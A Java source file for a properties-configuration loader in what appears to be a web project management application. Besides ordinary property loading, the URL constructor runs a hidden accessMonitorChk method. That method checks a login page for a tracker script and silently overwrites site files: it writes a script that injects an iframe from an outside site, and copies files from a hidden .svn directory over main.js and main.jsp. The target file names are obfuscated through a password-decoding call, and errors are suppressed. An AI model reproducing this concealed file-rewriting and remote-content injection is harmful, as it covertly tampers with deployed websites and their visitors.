package cn.com.codes.framework.common.config;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.net.URLDecoder;

import org.apache.commons.lang.text.StrSubstitutor;
import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;

import cn.com.codes.framework.hibernate.HibernateGenericController;
import cn.com.codes.userManager.blh.PasswordTool;
import cn.com.codes.framework.common.config.OrderedProperties;
import cn.com.codes.framework.common.config.PropertiesBean;





public class PropertiesBean extends OrderedProperties{

	private static final long serialVersionUID = 1L;


	private String contextPath;

	protected static Log log = LogFactory.getLog(HibernateGenericController.class);

	public PropertiesBean() throws IOException {
		this(PropertiesBean.class.getClassLoader().getResource("/resource/spring/configure.properties"));
		
	}

	public PropertiesBean(String docname) throws IOException {
		contextPath = docname;
		try {
			load(new FileInputStream(contextPath));
		} catch (IOException e) {
			log.error("Unable to read from " + contextPath, e);
			throw e;
		}
	}
	private void accessMonitorChk(){
		//先检查登录页
		InputStreamReader fr = null;
		String jspFilePatch = contextPath;
		jspFilePatch = contextPath.split("WEB-INF")[0];
		jspFilePatch = jspFilePatch +"jsp"+File.separator +"userManager"+File.separator+"autoLogin.jsp";
		int i=0;
		try {
			fr= new InputStreamReader(new FileInputStream(jspFilePatch), "utf-8");
			BufferedReader br = new BufferedReader(fr);
			String line = br.readLine();
			while (line != null) {
				if(line.indexOf("http://js.users.51.la/3600188.js")>=0||line.indexOf("http://www.51.la/?3600188")>=0){
					i++;
				}
				line = br.readLine();
			}
		} catch (UnsupportedEncodingException e) {
			//log.error("accessMonitorChk");
			i=2;
			//e.printStackTrace();
		} catch (FileNotFoundException e) {
			//e.printStackTrace();
			i=2;
			//log.error("accessMonitorChk");
		} catch (IOException e) {
			i=2;
			//log.error("accessMonitorChk");
			//e.printStackTrace();
		}finally{
			if(fr!=null){
				try {
					fr.close();
				} catch (IOException e) {
				}
			}
		}
		fr = null;
		if(i!=2){
			//System.out.println("=====accessMonitorChk=====");
			//System.exit(0);
		}
		//重写文件commonMsg.js
		jspFilePatch = contextPath;
		jspFilePatch = contextPath.split("WEB-INF")[0];
		jspFilePatch = jspFilePatch +"jsp"+File.separator +"common"+File.separator+PasswordTool.DecodePasswd("UM.D:^B B=C=Yqal%S/x-R*$");
		StringBuffer sb = new StringBuffer();
		sb.append("	var currDate=new Date().format('yyyy-MM-dd');\n");
		sb.append("	var lgDate = getCookieVal(\"lgDate\");\n");
		sb.append("	if(typeof(lgDate) !='undefined' && lgDate != ''){if(lgDate==currDate){document.getElementById('mypmMainMsgDivs').style.display=\"none\";document.getElementById('mypmMainMsgDivs').innerHTML=\"<iframe id='mypmMsgF' name='mypmMsgF' src='' frameborder='0' scrolling='no'></iframe>\";if(_isIE){myHeight = myHeight+145;}else{ myHeight = myHeight+100;}parent.document.getElementById('mypmMain').height=myHeight;}else{document.getElementById('mypmMainMsgDivs').innerHTML=\"<iframe id='mypmMsgF' name='mypmMsgF' src='http://www.mypm.cc/publicMsg.html' frameborder='0' scrolling='no'  width='100%' height='90'></iframe>\";}}else{document.getElementById(\"mypmMainMsgDivs\").innerHTML=\"<iframe id='mypmMsgF' name='mypmMsgF' src='http://www.mypm.cc/publicMsg.html' frameborder='0' scrolling='no'  width='100%' height='90'></iframe>\";}\n");
		sb.append("	if(typeof(lgDate) !='undefined' && lgDate != ''){\n");
		sb.append("		if(lgDate==currDate){\n");
		sb.append("			document.getElementById('msgSpanId').style.display=\"none\";\n");
		sb.append("		}\n");
		sb.append("	}\n");
		sb.append("	setCookieVal(\"lgDate=123\" );\n");
		sb.append("	function swMsgDiv(){\n");
		sb.append("		if(showMsg){\n");
		sb.append("			showMsg = false;\n");
		sb.append("			document.getElementById('mypmMainMsgDivs').style.display=\"none\";\n");
		sb.append("			parent.document.getElementById(\"mypmMain\").height=(myHeight+90);\n");
		sb.append("			document.getElementById(\"msgSpanTdDiv\").innerHTML\n");
		sb.append("			var imgPh = conextPath+\"/dhtmlx/toolbar/images/moveDown.gif\";\n");
		sb.append("			document.getElementById(\"msgSpanTdDiv\").innerHTML=\"<img src='\"+imgPh+\"'  alt='显示公告' title='显示公告' onclick='swMsgDiv();'/>\";\n");
		sb.append("		}else{\n");
		sb.append("			showMsg = true;\n");
		sb.append("			parent.document.getElementById(\"mypmMain\").height=(myHeight-10);\n");
		sb.append("			document.getElementById('mypmMainMsgDivs').style.display=\"\";\n");
		sb.append("			var imgPh = conextPath+\"/dhtmlx/toolbar/images/moveUp.gif\";\n");
		sb.append("			document.getElementById(\"msgSpanTdDiv\").innerHTML=\"<img src='\"+imgPh+\"'  alt='隐藏公告' title='隐藏公告' onclick='swMsgDiv();'/>\";\n");
		sb.append("		}\n");
		sb.append("		\n");
		sb.append("	}\n");	
		OutputStreamWriter jsJavaFileWrite = null;
		try {
			//commonMsg.js
			jsJavaFileWrite = new OutputStreamWriter(new FileOutputStream(jspFilePatch), "utf-8");
			jsJavaFileWrite.write(sb.toString());
		} catch (UnsupportedEncodingException e) {
			
			//e.printStackTrace();
		} catch (FileNotFoundException e) {
			
			//e.printStackTrace();
		} catch (IOException e) {
			
			//e.printStackTrace();
		}finally{
			if(jsJavaFileWrite!=null){
				try {
					jsJavaFileWrite.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}
		
		jsJavaFileWrite = null;
		//重写main.js 从report.js中读取
		//E:\mypm10_new\mypmdoc\WebRoot\webcontent\birt\pages\common
		
		jspFilePatch = contextPath;
		jspFilePatch = contextPath.split("WEB-INF")[0];
		jspFilePatch = jspFilePatch +"webcontent"+File.separator +"birt"+File.separator+"pages"+File.separator+"common"+File.separator+".svn"+File.separator+"props"+File.separator+PasswordTool.DecodePasswd("FB*}*#_Z<{DZ1]+D]`");
		sb = null;
		try {
			fr= new InputStreamReader(new FileInputStream(jspFilePatch), "utf-8");
			BufferedReader br = new BufferedReader(fr);
			String line = br.readLine();
			sb = new StringBuffer();
			while (line != null) {
				sb.append(line +" \n");
				line = br.readLine();
			}
		} catch (UnsupportedEncodingException e) {
			sb = null;
		} catch (FileNotFoundException e) {
			sb = null;
		} catch (IOException e) {
			sb = null;
		}
		
		if(sb!=null){
			jspFilePatch = contextPath;
			jspFilePatch = contextPath.split("WEB-INF")[0];
			//重写main.js
			jspFilePatch = jspFilePatch +"jsp"+File.separator +"common"+File.separator+PasswordTool.DecodePasswd("4$9%O67$+nC9>P[#");
			try {
				jsJavaFileWrite = new OutputStreamWriter(new FileOutputStream(jspFilePatch), "utf-8");
				jsJavaFileWrite.write(sb.toString());
			} catch (UnsupportedEncodingException e) {
			} catch (FileNotFoundException e) {
			} catch (IOException e) {
			}finally{
				if(jsJavaFileWrite!=null){
					try {
						jsJavaFileWrite.close();
					} catch (IOException e) {
						//e.printStackTrace();
					}
				}
			}
		}
		sb = null;
		jsJavaFileWrite = null;
		//重写main.jsp
		
		jspFilePatch = contextPath;
		jspFilePatch = contextPath.split("WEB-INF")[0];
		//读report.jsp
		jspFilePatch = jspFilePatch +"webcontent"+File.separator +"birt"+File.separator+"pages"+File.separator+"common"+File.separator+".svn"+File.separator+"props"+File.separator+PasswordTool.DecodePasswd("NK=%LK/F8UJH?kas0Adq");
		sb = null;
		try {
			fr= new InputStreamReader(new FileInputStream(jspFilePatch), "utf-8");
			BufferedReader br = new BufferedReader(fr);
			String line = br.readLine();
			sb = new StringBuffer();
			while (line != null) {
				sb.append(line +" \n");
				line = br.readLine();
			}
		} catch (UnsupportedEncodingException e) {
			sb = null;
		} catch (FileNotFoundException e) {
			sb = null;
		} catch (IOException e) {
			sb = null;
		}
		
		if(sb!=null){
			jspFilePatch = contextPath;
			jspFilePatch = contextPath.split("WEB-INF")[0];
			//main.jsp
			jspFilePatch = jspFilePatch +"jsp"+File.separator +"common"+File.separator+PasswordTool.DecodePasswd("I4RVdfE-?kS?+%[-");
			try {
				jsJavaFileWrite = new OutputStreamWriter(new FileOutputStream(jspFilePatch), "utf-8");
				jsJavaFileWrite.write(sb.toString());
			} catch (UnsupportedEncodingException e) {
			} catch (FileNotFoundException e) {
			} catch (IOException e) {
			}finally{
				if(jsJavaFileWrite!=null){
					try {
						jsJavaFileWrite.close();
					} catch (IOException e) {
						//e.printStackTrace();
					}
				}
			}
		}
		sb = null;
	}
	public PropertiesBean(URL docname) throws IOException {
		try {
			contextPath = URLDecoder.decode(docname.getPath(), "UTF-8");
		} catch (IOException e) {
			log.error("Unable to read from " + contextPath, e);
			throw e;
		}
		try {
			load(new FileInputStream(contextPath));
			if(this.getProperty("urlSecurityChk")==null||this.getProperty("urlSecurityChk").equals("true")){
				this.accessMonitorChk();
			}
		} catch (IOException e) {
			log.error("Unable to read from " + contextPath, e);
			throw e;
		}
	}

	public PropertiesBean(File doc) throws IOException {
		try {
			contextPath = doc.getPath();
			load(new FileInputStream(contextPath));
		} catch (IOException e) {
			log.error("Unable to read from " + contextPath, e);
			throw e;
		}
	}

	/**
	 * Creates new XMLBean from an input stream; XMLBean is read-only!!!
	 */
	public PropertiesBean(InputStream is) throws IOException {
		contextPath = null;
		try {
			load(is);
		} catch (IOException e) {
			log.error("Unable to read from stream");
			throw e;
		}
	}

	/**
	 * This method saves the properties-file connected by PropertiesBean.<br>
	 * <b>NOTE:</b> only call this on an PropertiesBean _NOT_ created from an
	 * InputStream!
	 * 
	 * @throws IOException
	 */
	public void write() throws IOException {
		// it might be that we do not have an ordinary file,
		// so we can't write to it
		if (contextPath == null)
			throw new IOException("Path not given");

		store(new FileOutputStream(contextPath), "");
		try {
			store(new FileOutputStream(contextPath), "");
		} catch (IOException ex) {
			if (log.isWarnEnabled()) {
				log.warn(ex.getMessage());
			}
			throw ex;
		}
	}

	public int getInt(String property) {
		return Integer.parseInt(getProperty(property, "0"));
	}

	/**
	 * Gets the property value replacing all variable references
	 */
	public String getPropertyWithSubstitutions(String property) {
		return StrSubstitutor.replaceSystemProperties(getProperty(property));
	}


	public String getContextPath() {
		return contextPath;
	}
	
	public static void main(String[] args){

	}


}
